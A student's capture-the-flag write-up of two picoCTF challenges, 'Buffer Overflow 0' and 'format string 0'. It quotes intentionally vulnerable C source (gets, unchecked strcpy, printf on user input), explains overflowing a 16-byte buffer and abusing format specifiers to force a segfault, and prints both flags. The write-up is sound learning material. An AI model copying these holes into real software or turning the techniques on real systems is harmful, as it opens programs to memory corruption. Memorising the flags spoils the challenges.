# 1.Buffer Overflow 0  

After opening a challenge a source code was given which  was in C language which we are currently studying so i thought that this is going to be easy,
but after opening the code i found out that the code was familiar, but there was some new stuff that needed web surfing.


Connect using:
`nc saturn.picoctf.net 52857`


Contents of `vuln.c`:
```C
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

I went back to Pico and launched the instance, it asked for an input and i entered some random strings which in turn resulted in me getting exited from the code.
On further inspection in `vuln.c`, I could see `char buf1[100]`. Which meant `buf1` or buffer 1 was allocated a size of 100 chars. 

What really caught my attention was the function called `sigsegv_handler` after some surfing i found out what it means.
```c
void sigsegv_handler(int sig)
```
This function gets called automatically when a SIGSEGV (segmentation fault) signal occurs, sig parameter receives the signal number and Returns void because signal handlers don't return values to the caller.
After looking at the first hint i found the way to my flag
`How can you trigger the flag to print?`
Provide input longer than 16 bytes to overflow buf2 in the vuln() function and this will corrupt the stack and cause a segmentation fault finally the SIGSEGV handler triggers and prints the flag.

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
On passing input of more than 16 chars, the program gave out the flag. 


# Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`



# 2. format string 0

 After downloading the binary and the source code, I ran the challenge using the `nc` port provided,
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/fmstr0 $ nc mimas.picoctf.net 63143
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Breakf@st_Burger
Breakf@st_BurgerPatrick is still hungry!
Try to serve him something of larger size!
```
 On input of one of the options provided, the binary exited.
 So I opened the source code of the binary.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();

    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```
 Again the `segfault` was forwarded to `sigsev_handler` and it was used to print the flag, so that means I have to create some sort of an overflow here.
 The program was divided into two levels `serve_patrick` and `serve_bob`. The first level could be passed just by inputting the option which has size greater than 2 times the `BUFSIZE`  which was defined to be 32 in the definitions, so the size should be greater than `64` bytes.
 Here the option `Gr%114d_Cheese` had the substring `%114d`, on reading about it on the net, I found out that `114` in the `%d`(integer) format specifier forces it to output an integer from the memory stack which is padded to 114 characters, which is greater than `64` bytes. 
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/fmstr0 $ nc mimas.picoctf.net 63143
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation:
```

- I finally moved on to the next level. Here again it required you to choose an option. Looking back at the source code, I could see that there was no other option than to `segfault` to get the flag.
- So out the three options, one option caught my eye, `Cla%sic_Che%s%steak`, this string had three proper format specifiers `%s` (`Pe%to_Portobello` had `%t` but that is not a format specifier), So I inputted that and that caused the binary to go to `sigsev_handler` and print the flag. 
```zsh
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
 On further reading, I got to know that the reason this worked was because when you don't pass any string variable and only use `%s` in `printf()`, it can cause it to read garbage values form the memory stack, it can also infer to point at memory address outside of the binary. Due to that the program opted to force it to segmentation violation.

# Flag: 'picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}'



